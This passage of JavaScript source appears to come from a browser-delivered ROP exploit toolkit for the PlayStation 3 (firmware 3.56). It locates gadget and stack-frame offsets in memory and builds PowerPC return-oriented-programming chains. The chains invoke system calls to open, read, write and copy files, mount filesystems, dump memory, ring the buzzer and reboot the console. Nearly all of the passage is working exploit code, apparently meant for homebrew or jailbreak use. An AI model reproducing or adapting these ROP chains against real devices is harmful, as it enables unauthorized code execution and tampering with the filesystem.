    t_out=setTimeout(initROP,1000);
    resetSearchOffsetMsg();
}

function showWaitMessage(msg)
{
    if(msg===""){result_msg=msg_exec_init;}else{result_msg=msg;}
    document.getElementById('result').innerHTML=result_msg;
}

function resetSearchOffsetMsg()
{
    if(allOffsetsFound)
    {
        result_msg=msg_verify_offsets;
    }
    else
    {
        result_msg=msg_search_offsets;
    }
    
    if((allOffsetsFound)&&(allOffsetsVerified))
    {
        result_msg=msg_success_init;
    }
    else
    {
        result_msg=msg_search_offsets;
    }
    
    // If any offsets are 0x0 then show search message
    if((base_fp_addr===0)||(stack_frame_addr===0)||(jump_2_addr===0)||(jump_1_addr===0))
    {
        result_msg=msg_search_offsets;
    }
    
    // reset string search message to fail if total=max (fix later)
    if(total_loops===max_loops)
    {
        result_msg=msg_string_verify_fail;
    }
    
    //showFoundOffsets(offset_find_jump1);
    document.getElementById('result').innerHTML=result_msg;
}

function resetOffsetAddresses()
{
    // Reset Addresses
    usb_fp_addr=0;
    usb_fp2_addr=0;
    hdd_fp_addr=0;
    hdd_fp2_addr=0;
    path_fp_addr=0;
    path_fp2_addr=0;
    path_src_fp_addr=0;
    path_dest_fp_addr=0;
    fd_addr=0;
    fd2_addr=0;
    file_mode_fp_addr=0;
    
    found_offsets=[];
    if(base_fp_addr!=0){base_offsets.push(base_fp_addr);}else{base_offsets=[];}
    if(stack_frame_addr!=0){stack_offsets.push(stack_frame_addr);}else{stack_offsets=[];}
    if(jump_2_addr!=0){jump2_offsets.push(jump_2_addr);}else{jump2_offsets=[];}
    if(jump_1_addr!=0){jump1_offsets.push(jump_1_addr);}else{jump1_offsets=[];}
    
    //if(!base_verified){base_fp_addr=0;}
    //if(!stackframe_verified){stack_frame_addr=0;}
    //if(!j2_verified){jump_2_addr=0;}
    //if(!j1_verified){jump_1_addr=0}
    
    /*
    for(x=0;x<base_offsets.length;x+=1)
    {
        if(base_offsets[x]===exploit_addr)
        {
            
        }
    }
    */
}

function setDefaultPointerValues()
{
    usb_fp=0x40404040;
    usb_fp2=0x41414141;
    hdd_fp=0x0000001C;
    hdd_fp2=0x43434343;
    usb_fd2=0x45454545;
    hdd_fd=0x46464646;
    hdd_fd2=0x47474747;
    fd=0x48484848;
    fd2=0x49494949;
    magic=0x4A4A4A4A;
    magic2=0x4B4B4B4B;
}

function setCustomPointerValues()
{
    // Set bytes to write for db_rebuild and restore_stack for others
    if(chain_stackframe==="db_rebuild"){write_bytes=db_rebuild_bytes;}else{write_bytes=restore_stack;}
    
    // Set values for AutoSize Read/Write Chains
    /*
    004C7EF4 81290014 lwz        r9,0x14(r9) <-- hdd_fd
    004C7EF8 80090000 lwz        r0,0x0(r9) 
    */
    if((chain_stackframe==="file_read_write_test")&&(useAutoSize)){write_bytes=g_set_r3_from_r29;hdd_fd=g_set_r3_from_r29;hdd_fd2=g_toc;}
    
    // Set mount params
    if(chain_stackframe==="sys_fs_mount"){path_fp=mount_device;path_fp2=mount_fs;path_src_fp=mount_path;}
    
    // VSH printf Params
    if(chain_stackframe==="vsh_printf_test"){path_fp=vsh_printf_arg1;path_fp2=vsh_printf_arg1;}
    //if(chain_stackframe==="vsh_printf_test"){path_fp2="NPMT";}
}

function setPointerOffsets()
{
    file_mode_fp_addr=base_fp_addr+0x2;
    write_bytes_addr=base_fp_addr+0x4;
    usb_fp_addr=base_fp_addr+0x8;
    usb_fp2_addr=base_fp_addr+0xC;
    hdd_fp_addr=base_fp_addr+0x10;
    hdd_fp2_addr=base_fp_addr+0x14;
    usb_fd_addr=base_fp_addr+0x18;
    usb_fd2_addr=base_fp_addr+0x1C;
    hdd_fd_addr=base_fp_addr+0x20;
    hdd_fd2_addr=base_fp_addr+0x24;
    fd_addr=base_fp_addr+0x28;
    fd2_addr=base_fp_addr+0x2C;
    magic_addr=base_fp_addr+0x30;
    magic_addr2=base_fp_addr+0x34;
    
    // Path Strings
    path_fp_addr=base_fp_addr+0x3C;
    path_fp2_addr=path_fp_addr+path_fp.length;
    
    path_src_fp_addr=path_fp2_addr+path_fp2.length+0x2;
    path_dest_fp_addr=path_src_fp_addr+path_src_fp.length+0x2;
    
    
    if(str2u_adjusted)
    {
        path_dest_fp_addr=path_src_fp_addr+path_src_fp.length+0x3;
    }
    else
    {
        path_dest_fp_addr=path_src_fp_addr+path_src_fp.length+0x2;
    }
    
        
    // Super Hacky Way to fix mount for now :)
    //if(chain_stackframe==="sys_fs_mount"){path_fp_addr=path_fp_addr-0x2;}
    //if(chain_stackframe==="sys_fs_mount"){path_fp_addr=path_fp_addr-0x2;path_fp2_addr=path_fp2_addr+0x1;}
    if(chain_stackframe==="sys_fs_mount"){path_fp_addr=path_fp_addr-0x2;path_fp2_addr=path_fp2_addr+0x1;path_src_fp_addr=path_src_fp_addr+0x2;}
}

function checkSearchParams()
{
    if(search_max_threshold===0){search_max_threshold = search_max_threshold_backup;}// search threshold reset if zero
    if(search_base_offset<search_base_offset_min){search_base_offset = search_base_offset_min;}// if too low
    if(search_base_offset>search_base_offset_max){search_base_offset = search_base_offset_min+search_base_offset_adjust;}// if too high
    if(base_fp_addr===0){search_base_offset = search_base_offset_min;}// reset start offset for search if zero
}

function searchResetTimeout()
{
    if(t_out!=0){clearTimeout(t_out);}
    //clearTimeout(t_out);
}

function enableActiveTrigger()
{
    disableElement("load_rop", false);
}

function verifyOffsetsToggle()
{
    if(verify_offsets)
    {
        verify_offsets=false;
    }
    else{
        verify_offsets=true;
    }
}

function verifyStackframeToggle()
{
    if(verify_stackframe)
    {
        verify_stackframe=false;
    }
    else{
        verify_stackframe=true;
    }
}

function disableElement(elem, state)
{
    document.getElementById(elem).disabled=state;
}

function checkBox(elem, state)
{
    document.getElementById(elem).checked=state;
}

function hideElement(elem, state)
{
    if(state)
    {
        return document.getElementById(elem).style.visibility='hidden';
    }
    else{
        return document.getElementById(elem).style.visibility='visible';
    }
}

function removeElement(elem, state)
{
    if(state)
    {
        return document.getElementById(elem).style.display='none';
    }
    else{
        return document.getElementById(elem).style.display='block';
    }
}

function setValueToHTML(elem, v)
{
    document.getElementById(elem).value=v;
}

function getValueFromHTML(elem)
{
    return document.getElementById(elem).value;
}

function loadSettings(data)
{
    getCookie(data);
    alert(msg_settings_load);
}

function saveSettings(data)
{
    setCookie(data);
    alert(msg_settings_save);
}

function compatCheck(version)
{
    if(version<"3.56"){isFW356=false;isCompatCFW=true;return "";}// compatible
    if(version==="3.56"){isFW356=true;isCompatCFW=true;return "";}// compatible
    if(version>"3.56"){isFW356=false;isCompatCFW=false;return msg_minver_compat_not;}// not compatible
}

function showReturnValue(addr)
{
    if(rtn_val_seen)
    {
        rtn_val=checkMemory(storage_get_device_info_buffer_ptr-0x10,0x100,0x100,10);
        rtn_val=s2hex(rtn_val).toString().slice(3, 12);
        alert(msg_get_device_info1+rtn_val+msg_get_device_info2);
    }
    else
    {
        rtn_val_seen=true;
        rtn_val=msg_device_loaded_into_mem;
        alert(rtn_val.toString());
    }
}

function showMinVersion()
{
    if(minver_seen)
    {
        minver=checkMemory(temp_addr_8C-0x8,0x100,0x100,10);
        minver=s2hex(minver).toString().slice(3, 8).replace("00",".");
        alert(msg_minver_start+minver.toString()+msg_minver_mid+compatCheck(minver.toString())+msg_minver_end);
    }
    else
    {
        minver_seen=true;
        minver=msg_minver_loaded_into_mem;
        alert(minver.toString());
    }
}

function showTemps()
{
    if(temps_both_seen)
    {
        temp_cell=checkMemory(get_temperature_temp_cell_ptr-0x8,0x100,0x100,10);
        temp_cell=s2hex(temp_cell).slice(0,4);
        temp_cell_hex=temp_cell.slice(0,2);
        temp_cell_hexf=temp_cell.slice(2,4);
        temp_cell_hexc=parseInt(temp_cell_hexf,16)/256;
        temp_cell_hex_final=parseInt(temp_cell_hex,16).toString()+"."+temp_cell_hexc.toString();
        
        temp_rsx=checkMemory(get_temperature_temp_rsx_ptr-0x8,0x100,0x100,10);
        temp_rsx=s2hex(temp_rsx).slice(0,4);
        temp_rsx_hex=temp_rsx.slice(0,2);
        temp_rsx_hexf=temp_rsx.slice(2,4);
        temp_rsx_hexc=parseInt(temp_rsx_hexf,16)/256;
        temp_rsx_hex_final=parseInt(temp_rsx_hex,16).toString()+"."+temp_rsx_hexc.toString();
        
        alert(msg_temps_cell+temp_cell_hex_final+msg_temps_celcius+msg_temps_rsx+temp_rsx_hex_final+msg_temps_celcius);
    }
    else
    {
        temps_both_seen=true;
        alert(msg_temps_loaded_into_mem);
    }
}

function showFoundOffsetsMsg()
{
    document.getElementById('outShowOffsets').innerHTML="<h4><b><font color=%22#"+colortext+"%22>"+msg_found_offsets+"</font><font color=%22#"+base_fp_color+"%22>base_fp: </font>"+"<font color=%22#"+base_fp_acolor+"%22>0x"+base_fp_addr.toString(16).toUpperCase()+"</font><font color=%22#"+stack_frame_color+"%22> | stack_frame_addr: </font>"+"<font color=%22#"+stack_frame_acolor+"%22>0x"+stack_frame_addr.toString(16).toUpperCase()+"</font><font color=%22#"+jump_2_color+"%22> | jump_2_addr: </font>"+"<font color=%22#"+jump_2_acolor+"%22>0x"+jump_2_addr.toString(16).toUpperCase()+"</font><font color=%22#"+jump_1_color+"%22> | jump_1_addr: </font>"+"<font color=%22#"+jump_1_acolor+"%22>0x"+jump_1_addr.toString(16).toUpperCase()+"</font></b></h4>";
}

function showFoundOffsets(search)
{
    switch(search)
    {
        case offset_find_base_fp:
        if(base_fp_addr<0){base_fp_addr=0;}
        if(base_fp_addr!=0){base_fp_acolor=colorSuccess;}
        if(base_found){base_fp_acolor=colorSuccess;}else{base_fp_acolor=colorActive;}
        if(base_verified){base_fp_acolor=colorVerified;}
        if(base_fp_addr===0){base_fp_acolor=colorActive;result_msg=msg_search_offsets;}
        break;
        
        case offset_find_stack_frame:
        if(stack_frame_addr<0){stack_frame_addr=0;}
        if(stack_frame_addr!=0){stack_frame_acolor=colorSuccess;}
        if(stackframe_found){stack_frame_acolor=colorSuccess;}else{stack_frame_acolor=colorActive;}
        if(stackframe_verified){stack_frame_acolor=colorVerified;}
        if(stack_frame_addr===0){stack_frame_acolor=colorActive;result_msg=msg_search_offsets;}
        break;
        
        case offset_find_jump2:
        if(jump_2_addr<0){jump_2_addr=0;}
        if(jump_2_addr!=0){jump_2_acolor=colorSuccess;}
        if(j2_found){jump_2_acolor=colorSuccess;}else{jump_2_acolor=colorActive;}
        if(j2_verified){jump_2_acolor=colorVerified;}
        if(jump_2_addr===0){jump_2_acolor=colorActive;result_msg=msg_search_offsets;}
        break;
        
        case offset_find_jump1:
        if(jump_1_addr<0){jump_1_addr=0;}
        if(jump_1_addr!=0){jump_1_acolor=colorSuccess;}
        if(j1_found){jump_1_acolor=colorSuccess;}else{jump_1_acolor=colorActive;}
        if(j1_verified){jump_1_acolor=colorVerified;}
        if(jump_1_addr===0){jump_1_acolor=colorActive;result_msg=msg_search_offsets;}
        break;
        
        case offset_find_success:
        if(stack_frame_addr!=0){stack_frame_acolor=colorSuccess;}
        if(stack_frame_addr!=0){stack_frame_acolor=colorSuccess;}
        if(jump_2_addr!=0){jump_2_acolor=colorSuccess;}
        if(jump_1_addr!=0){jump_1_acolor=colorSuccess;}
        if(base_found){base_fp_acolor=colorSuccess;}
        if(stackframe_found){stack_frame_acolor=colorSuccess;}
        if(j2_found){jump_2_acolor=colorSuccess;}
        if(j1_found){jump_1_acolor=colorSuccess;}
        break;
        
        case offset_find_verified:
        if(base_verified){base_fp_acolor=colorVerified;}
        if(stackframe_verified){stack_frame_acolor=colorVerified;}
        if(j2_verified){jump_2_acolor=colorVerified;}
        if(j1_verified){jump_1_acolor=colorVerified;}
        if(allOffsetsVerified){result_msg=msg_verify_offsets;}
        break;
        
        default:
        break;
    }
    
    showFoundOffsetsMsg();
}

// Enable and Disable Stuff
function toggleDisableButtons(state)
{   
    disableElement("init_rop", state);
    disableElement("load_rop", state);
    disableElement("reset-options", state);
    disableElement("debug-alert", state);
    
    disableElement("load_settings", state);
    disableElement("save_settings", state);
    
    disableElement("number_of_beeps_edit", state);
    
    disableElement("marked_memdump_addr", state);
    disableElement("marked_memdump_size", state);
    disableElement("marked_memdump_addr_edit", state);
    disableElement("marked_memdump_size_edit", state);
    disableElement("memdump_save_new_values", state);
    disableElement("marked_memdump_range", state);
    
    disableElement("disable_trigger", state);
    disableElement("marked_hex", state);
    disableElement("marked_hex_dump", state);
    disableElement("marked_hex_file_system", state);
    disableElement("marked_hex_fun", state);
    disableElement("marked_hex_debugging", state);
    disableElement("marked_hex_memory", state);
    disableElement("marked_hex_process", state);
    disableElement("marked_hex_process_id", state);
    disableElement("marked_hex_storage", state);
    disableElement("write_protection_toggle", state);
    disableElement("marked_hex_threads", state);
    disableElement("marked_hex_threads_id", state);
    
    disableElement("marked_hex_network", state);
    disableElement("network_url_edit", state);
    
    disableElement("marked_hex_system", state);
    disableElement("marked_hex_system_led", state);
    disableElement("marked_hex_system_led_color", state);
    disableElement("marked_hex_system_led_action", state);
    //disableElement("marked_hex_system_fan_speed", state);
    //disableElement("marked_hex_system_fan_settings", state);
    
    disableElement("mounting_device", state);
    disableElement("mounting_fs", state);
    disableElement("mounting_path", state);
    
    disableElement("marked_reboot", state);
    disableElement("default_settings", state);
    disableElement("marked_user_id", state);
    disableElement("marked_chmod", state);
    
    disableElement("file_size_edit", state);
    disableElement("btn_file_size_edit", state);
    
    disableElement("title_id_edit", state);
    disableElement("btn_title_id_edit", state);
    
    disableElement("path_src", state);
    disableElement("path_dest", state);
    disableElement("path_src_type", state);
    disableElement("path_dest_type", state);
    disableElement("marked_xmb_select", state);
    disableElement("flash_type_nand", state);
    disableElement("flash_type_nor", state);
    disableElement("flash_type_emmc", state);
    disableElement("debug_option", state);
    disableElement("verify_offsets", state);
    disableElement("verify_stackframe", state);
    disableElement("marked_search_size", state);
    disableElement("marked_search_base_offset", state);
    disableElement("marked_search_stack_adjust", state);
    disableElement("marked_search_range_size", state);
    disableElement("marked_search_max_loops", state);
}

// Setup all Stack Frame Parameters
// Called From loader.js

function stackFrameTest()
{
    a1_r3=sc_buzzer_arg1;
    a1_r4=sc_buzzer_arg2;
    a1_r5=sc_buzzer_arg3;
    a1_r11=sc_sys_sm_ring_buzzer;
    a1_jumpto=g_set_r4_thru_r11;
    a2_jumpto=g_set_r3_from_r29;
    a3_jumpto=g_sc_A0;
    a4_r3=sc_buzzer_arg1;
    a4_r4=sc_buzzer_arg2;
    a4_r5=sc_buzzer_arg3;
    a4_r11=sc_sys_sm_ring_buzzer;
    a4_jumpto=g_set_r4_thru_r11;
    a5_jumpto=g_set_r3_from_r29;
    a6_jumpto=g_sc_A0;
    a7_r3=sc_buzzer_arg1;
    a7_r4=sc_buzzer_arg2;
    a7_r5=sc_buzzer_arg3;
    a7_r11=sc_sys_sm_ring_buzzer;
    a7_jumpto=g_set_r4_thru_r11;
    a8_jumpto=g_set_r3_from_r29;
    a9_jumpto=g_sc_A0;
    a10_r3=sc_buzzer_arg1;
    a10_r4=sc_buzzer_arg2;
    a10_r5=sc_buzzer_arg3;
    a10_r11=sc_sys_sm_ring_buzzer;
    a10_jumpto=g_set_r4_thru_r11;
    a11_jumpto=g_set_r3_from_r29;
    a12_jumpto=g_sc_A0;
    a13_r3=sc_buzzer_arg1;
    a13_r4=sc_buzzer_arg2;
    a13_r5=sc_buzzer_arg3;
    a13_r11=sc_sys_sm_ring_buzzer;
    a13_jumpto=g_set_r4_thru_r11;
    a14_jumpto=g_set_r3_from_r29;
    a15_jumpto=g_sc_A0;
    a16_r3=sc_buzzer_arg1;
    a16_r4=sc_buzzer_arg2;
    a16_r5=sc_buzzer_arg3;
    a16_r11=sc_sys_sm_ring_buzzer;
    a16_jumpto=g_set_r4_thru_r11;
    a17_jumpto=g_set_r3_from_r29;
    a18_jumpto=g_sc_A0;
    a19_r3=sc_buzzer_arg1;
    a19_r4=sc_buzzer_arg2;
    a19_r5=sc_buzzer_arg3;
    a19_r11=sc_sys_sm_ring_buzzer;
    a19_jumpto=g_set_r4_thru_r11;
    a20_jumpto=g_set_r3_from_r29;
    a21_jumpto=g_sc_A0;
    a22_r3=sc_buzzer_arg1;
    a22_r4=sc_buzzer_arg2;
    a22_r5=sc_buzzer_arg3;
    a22_r11=sc_sys_sm_ring_buzzer;
    a22_jumpto=g_set_r4_thru_r11;
    a23_jumpto=g_set_r3_from_r29;
    a24_jumpto=g_sc_A0;
    a25_r3=sc_buzzer_arg1;
    a25_r4=sc_buzzer_arg2;
    a25_r5=sc_buzzer_arg3;
    a25_r11=sc_sys_sm_ring_buzzer;
    a25_jumpto=g_set_r4_thru_r11;
    a26_jumpto=g_set_r3_from_r29;
    a27_jumpto=g_sc_A0;
    a28_r3=sc_buzzer_arg1;
    a28_r4=sc_buzzer_arg2;
    a28_r5=sc_buzzer_arg3;
    a28_r11=sc_sys_sm_ring_buzzer;
    a28_jumpto=g_set_r4_thru_r11;
    a29_jumpto=g_set_r3_from_r29;
    a30_jumpto=g_sc_A0;
    a31_r11=restore_stack;
    a31_jumpto=g_set_r4_thru_r11;
    a32_jumpto=g_exit_chain;
    //a33_jumpto=g_exit_chain;
}

function syscallAndExit(r3,r4,r5,r6,r7,r8,r9,r10,r11,r30,r31)
{
    a1_r3=r3;
    a1_r4=r4;
    a1_r5=r5;
    a1_r6=r6;
    a1_r7=r7;
    a1_r8=r8;
    a1_r9=r9;
    a1_r10=r10;
    a1_r11=r11;
    a1_r29=r29;
    a1_r30=r30;
    a1_r31=r31;
    a1_jumpto=g_set_r4_thru_r11;
    a2_jumpto=g_set_r3_from_r29;
    a3_jumpto=g_sc_A0;
    a4_r11=restore_stack;
    a4_jumpto=g_set_r4_thru_r11;
    a5_jumpto=g_exit_chain;
}

function syscallTwoAndExit(r3a,r4a,r5a,r6a,r7a,r8a,r9a,r10a,r11a,r30a,r31a,r3b,r4b,r5b,r6b,r7b,r8b,r9b,r10b,r11b,r30b,r31b)
{
    a1_r3=r3a;
    a1_r4=r4a;
    a1_r5=r5a;
    a1_r6=r6a;
    a1_r7=r7a;
    a1_r8=r8a;
    a1_r9=r9a;
    a1_r10=r10a;
    a1_r11=r11a;
    a1_r29=r3a;
    a1_r30=r30a;
    a1_r31=r31a;
    a1_jumpto=g_set_r4_thru_r11;
    a2_jumpto=g_set_r3_from_r29;
    a3_jumpto=g_sc_A0;
    a4_r3=r3b;
    a4_r4=r4b;
    a4_r5=r5b;
    a4_r6=r6b;
    a4_r7=r7b;
    a4_r8=r8b;
    a4_r9=r9b;
    a4_r10=r10b;
    a4_r11=r11b;
    a4_r29=r3b;
    a4_r30=r30b;
    a4_r31=r31b;
    a4_jumpto=g_set_r4_thru_r11;
    a5_jumpto=g_set_r3_from_r29;
    a6_jumpto=g_sc_A0;
    a7_r11=restore_stack;
    a7_jumpto=g_set_r4_thru_r11;
    a8_jumpto=g_exit_chain;
}

function syscallAndReboot(r3,r4,r5,r6,r7,r8,r9,r10,r11,r30,r31,mode,lpar_param,lpar_size)
{
    a1_r3=r3;
    a1_r4=r4;
    a1_r5=r5;
    a1_r6=r6;
    a1_r7=r7;
    a1_r8=r8;
    a1_r9=r9;
    a1_r10=r10;
    a1_r11=r11;
    a1_r29=r29;
    a1_r30=r30;
    a1_r31=r31;
    a1_jumpto=g_set_r4_thru_r11;
    a2_jumpto=g_set_r3_from_r29;
    a3_jumpto=g_sc_A0;
    a4_r3=mode;
    a4_r4=lpar_param;
    a4_r5=lpar_size;
    a4_r11=sc_shutdown;
    a4_jumpto=g_set_r4_thru_r11;
    a5_jumpto=g_set_r3_from_r29;
    a6_jumpto=g_sc_A0;
}

function syscallFwriteAndExit(r3,r4,r5,r6,r7,r8,r9,r10,r11,r30,r31,dest,size,start_addr)
{
    a1_r3=r3;
    a1_r4=r4;
    a1_r5=r5;
    a1_r6=r6;
    a1_r7=r7;
    a1_r8=r8;
    a1_r9=r9;
    a1_r10=r10;
    a1_r11=r11;
    a1_r29=r29;
    a1_r30=r30;
    a1_r31=r31;
    a1_jumpto=g_set_r4_thru_r11;
    a2_jumpto=g_set_r3_from_r29;
    a3_jumpto=g_sc_A0;
    a4_r3=dest;
    a4_r4=file_mode_fp_addr;
    a4_r5=size;
    a4_r30=start_addr;
    a4_jumpto=g_set_r4_thru_r11;
    a5_jumpto=g_set_r3_from_r29;
    a6_r29=size;
    a6_jumpto=e_fopen_write_close;
    extra1=size;
    a7_jumpto=restore_stack;
    extra2=g_exit_chain;
}

function syscallFwriteAndReboot(dest,size,start_addr,mode,lpar_param,lpar_size)
{
    a1_r3=dest;
    a1_r4=file_mode_fp_addr;// address of file mode [wb]
    a1_r5=size;
    a1_r30=start_addr;
    a1_jumpto=g_set_r4_thru_r11;
    a2_jumpto=g_set_r3_from_r29;
    padding1=pad4ext;// fix for extsw instruction
    a3_r31=mode;// is r3 but uses r31 place in chain
    a3_jumpto=e_fopen_write_close;
    a4_r6=sc_shutdown;// is r11 but uses r6 place in chain
    a4_r9=0x00000000;// is r4 but uses r9 place in chain
    a4_r29=size;// size;
    a4_jumpto=g_set_r4_thru_r11;
    a5_r5=lpar_param;// reboot flag
    a5_r6=lpar_size;// reboot flag
    a5_r31=g_sc_A0;// using r31 spot in chain to set jump
}

function syscallReadWriteFile(src,dest,size)
{
    a1_r3=src;// path
    a1_r4=open_flag_read;// flags
    a1_r5=usb_fp_addr;// source fd
    //a1_r6=open_size_default;// size
    a1_r6=size;// size
    a1_r7=open_mode;// mode
    a1_r8=0x0;// mode
    a1_r11=sc_sys_fs_open;
    a1_jumpto=g_set_r4_thru_r11;
    a2_jumpto=g_set_r3_from_r29;
    a3_jumpto=g_sc_A0;
    a4_r3=dest;// path
    a4_r4=open_flag_create;// flags [create new empty file]
    a4_r5=hdd_fp_addr;// destination fd
    a4_r6=0x0;// size
    a4_r7=0x0;// mode
    a4_r8=0x0;// mode
    a4_r11=sc_sys_fs_open;
    a4_jumpto=g_set_r4_thru_r11;
    a5_jumpto=g_set_r3_from_r29;
    a6_jumpto=g_sc_A0;
    a7_r3=usb_fp_addr;// read fd
    a7_r4=read_buf;// pointer
    //a7_r5=read_nbytes;// # of bytes to read
    a7_r5=size;// # of bytes to read
    a7_r6=read_nread;// pointer
    a7_r9=usb_fp_addr;// sets fd for read
    a7_r11=sc_sys_fs_read;
    a7_jumpto=g_set_r4_thru_r11;
    a8_jumpto=g_set_r3_from_r29;
    a9_jumpto=g_sc_set_r3_from_r9;// put fd into r3
    a10_r3=hdd_fp_addr;// write fd
    a10_r8=write_buf;// register is r4 pointer
    a10_r10=size;// register is r5 # of bytes to read
    extra2=write_nwrite;// register is r6 pointer
    a10_r6=hdd_fp_addr;// register is r9 sets fd for write
    extra5=g_set_r4_thru_r11;
    extra1=g_set_r3_from_r29;
    extra3=g_sc_set_r3_from_r9;
    extra4=sc_sys_fs_write;// register is r11
    a13_r30=g_set_r31_F8;// must change r31 to not get base_fp overwritten
    a15_r10=usb_fp_addr;// put fd into r3 to close source
    a15_r11=sc_sys_fs_close;
    a16_jumpto=g_set_r4_thru_r11;// setup params now for closing file descriptors
    a15_jumpto=g_sc_set_r3_from_r10;// using gadget 15 spot in chain
    a17_jumpto=g_set_r4_thru_r11;
    a18_jumpto=g_sc_A0
    a19_jumpto=g_set_r31_108;
    a20_r10=sc_sys_fs_close;// register is r11
    a21_r10=hdd_fp_addr;// put fd into r3 to close destination
    a20_jumpto=g_set_r4_thru_r11;
    a22_jumpto=g_sc_set_r3_from_r10;
    
    // both fd closed at this point successfully. need to exit chain now
    
    a21_jumpto=g_set_r4_thru_r11;
    a23_jumpto=g_set_r4_thru_r11;
    a24_r11=restore_stack;
    a24_jumpto=g_exit_chain;
    a25_r11=restore_stack;
}

function syscallReadWriteFileAuto(src,dest)
{
    a1_r3=src;
    a1_r4=sys_fs_stat_sb;
    a1_r11=sc_sys_fs_stat;
    a1_jumpto=g_set_r4_thru_r11;
    a2_jumpto=g_set_r3_from_r29;
    a3_jumpto=g_sc_A0;
    
    file_size_input_addr=sys_fs_stat_sb+0x20;// Size addr will be sys_fs_stat_sb+0x28
    
    a4_r3=file_size_input_addr;// r29 moving size into r5
    a4_r4=open_flag_read;
    a4_r5=0x140;
    a4_r6=usb_fp_addr;
    a4_r7=open_mode;
    a4_r8=0x0;
    a4_r9=hdd_fd_addr;// moves into r0
    a4_r11=sc_sys_fs_open;
    a4_jumpto=g_set_r4_thru_r11;
    a5_r9=hdd_fd_addr-0x14;// moves into r0
    a5_jumpto=g_set_r5_from_r29;// move size from r29 offset into r5
    a6_jumpto=g_set_r4_thru_r11;
    // a7_r3=sc_buzzer_arg1;
    // a7_r4=sc_buzzer_arg2;
    // a7_r5=sc_buzzer_arg3;
    // a7_r11=sc_sys_sm_ring_buzzer;
    a7_jumpto=g_set_r3_from_r29;
    // a8_jumpto=g_set_r3_from_r29;
    // a9_jumpto=g_sc_A0;
    // a10_r3=sc_buzzer_arg1;
    // a10_r4=sc_buzzer_arg2;
    // a10_r5=sc_buzzer_arg3;
    // a10_r11=sc_sys_sm_ring_buzzer;
    // a10_jumpto=g_set_r4_thru_r11;
    // a11_jumpto=g_set_r3_from_r29;
    // a12_jumpto=g_sc_A0;
    // a13_r3=sc_buzzer_arg1;
    // a13_r4=sc_buzzer_arg2;
    // a13_r5=sc_buzzer_arg3;
    // a13_r11=sc_sys_sm_ring_buzzer;
    // a13_jumpto=g_set_r4_thru_r11;
    // a14_jumpto=g_set_r3_from_r29;
    // a15_jumpto=g_sc_A0;
    // a16_r3=sc_buzzer_arg1;
    // a16_r4=sc_buzzer_arg2;
    // a16_r5=sc_buzzer_arg3;
    // a16_r11=sc_sys_sm_ring_buzzer;
    // a16_jumpto=g_set_r4_thru_r11;
    // a17_jumpto=g_set_r3_from_r29;
    // a18_jumpto=g_sc_A0;
    // a19_r3=sc_buzzer_arg1;
    // a19_r4=sc_buzzer_arg2;
    // a19_r5=sc_buzzer_arg3;
    // a19_r11=sc_sys_sm_ring_buzzer;
    // a19_jumpto=g_set_r4_thru_r11;
    // a20_jumpto=g_set_r3_from_r29;
    // a21_jumpto=g_sc_A0;
    // a22_r3=sc_buzzer_arg1;
    // a22_r4=sc_buzzer_arg2;
    // a22_r5=sc_buzzer_arg3;
    // a22_r11=sc_sys_sm_ring_buzzer;
    // a22_jumpto=g_set_r4_thru_r11;
    // a23_jumpto=g_set_r3_from_r29;
    // a24_jumpto=g_sc_A0;
    // a25_r3=sc_buzzer_arg1;
    // a25_r4=sc_buzzer_arg2;
    // a25_r5=sc_buzzer_arg3;
    // a25_r11=sc_sys_sm_ring_buzzer;
    // a25_jumpto=g_set_r4_thru_r11;
    // a26_jumpto=g_set_r3_from_r29;
    // a27_jumpto=g_sc_A0;
    // a28_r3=sc_buzzer_arg1;
    // a28_r4=sc_buzzer_arg2;
    // a28_r5=sc_buzzer_arg3;
    // a28_r11=sc_sys_sm_ring_buzzer;
    // a28_jumpto=g_set_r4_thru_r11;
    // a29_jumpto=g_set_r3_from_r29;
    // a30_jumpto=g_sc_A0;
    // a31_r11=restore_stack;
    // a31_jumpto=g_set_r4_thru_r11;
    // a32_jumpto=g_exit_chain;
    //a33_jumpto=g_exit_chain;
}

function syscallReadWriteDirectory(src,dest)
{
    // Open Source Directory
    a1_r3=src;
    a1_r4=sc_opendir_fd;
    a1_r11=sys_fs_opendir;
    a1_r29=src;
    a1_jumpto=g_set_r4_thru_r11;
    a2_jumpto=g_set_r3_from_r29;
    a3_jumpto=g_sc_A0;
    
    // Create Target Directory
    a4_r3=dest;
    a4_r4=sc_fs_mode;
    a4_r11=sc_sys_fs_mkdir;
    a4_r29=dest;
    a4_jumpto=g_set_r4_thru_r11;
    a5_jumpto=g_set_r3_from_r29;
    a6_jumpto=g_sc_A0;
    
    // Read Source Directory From File Descriptor
    a7_r3=sc_opendir_fd;
    a7_r4=sc_readdir_path;
    a7_r5=sc_readdir_nread;
    a7_r9=sc_opendir_fd;
    a7_r11=sys_fs_readdir;
    a7_r29=sc_opendir_fd;
    a7_jumpto=g_set_r4_thru_r11;
    a8_jumpto=g_set_r3_from_r29;
    a9_jumpto=g_sc_set_r3_from_r9;
    
    a10_r3=sc_opendir_fd;
    a10_r8=write_buf;// register is r4
    a10_r10=0;// register is r5
    extra2=write_nwrite;// register is r6
    a10_r6=sc_opendir_fd;// register is r9
    extra5=g_set_r4_thru_r11;
    extra1=g_set_r3_from_r29;
    extra3=g_sc_set_r3_from_r9;
    
    extra4=sc_sys_fs_write;// register is r11
    a13_r30=g_set_r31_F8;// must change r31 to not get base_fp overwritten
    a15_r10=usb_fp_addr;
    a15_r11=sc_sys_fs_close;
    a16_jumpto=g_set_r4_thru_r11;
    a15_jumpto=g_sc_set_r3_from_r10;// using gadget 15 spot in chain
    a17_jumpto=g_set_r4_thru_r11;
    a18_jumpto=g_sc_A0
    a19_jumpto=g_set_r31_108;
    a20_r10=sc_sys_fs_close;// register is r11
    a21_r10=hdd_fp_addr;
    a20_jumpto=g_set_r4_thru_r11;
    a22_jumpto=g_sc_set_r3_from_r10;
    
    a21_jumpto=g_set_r4_thru_r11;
    a23_jumpto=g_set_r4_thru_r11;
    a24_r11=restore_stack;
    a24_jumpto=g_exit_chain;
    a25_r11=restore_stack;
}

function exportStdcOpenReadCloseDir(src)
{
    a1_r3=src;
    a1_r4=4;
    a1_r5=5;
    a1_r6=6;
    a1_r7=7;
    a1_r8=8;
    a1_r9=9;
    a1_r10=10;
    a1_r11=11;
    a1_r29=29;
    a1_r30=30;
    a1_r31=31;
    a1_jumpto=g_set_r4_thru_r11;
    a2_jumpto=g_set_r3_from_r29;
    a3_jumpto=e_stdc_opendir;
    a4_r3=3;
    a4_r4=4;
    a4_r5=5;
    a4_r6=6;
    a4_r7=7;
    a4_r8=8;
    a4_r9=9;
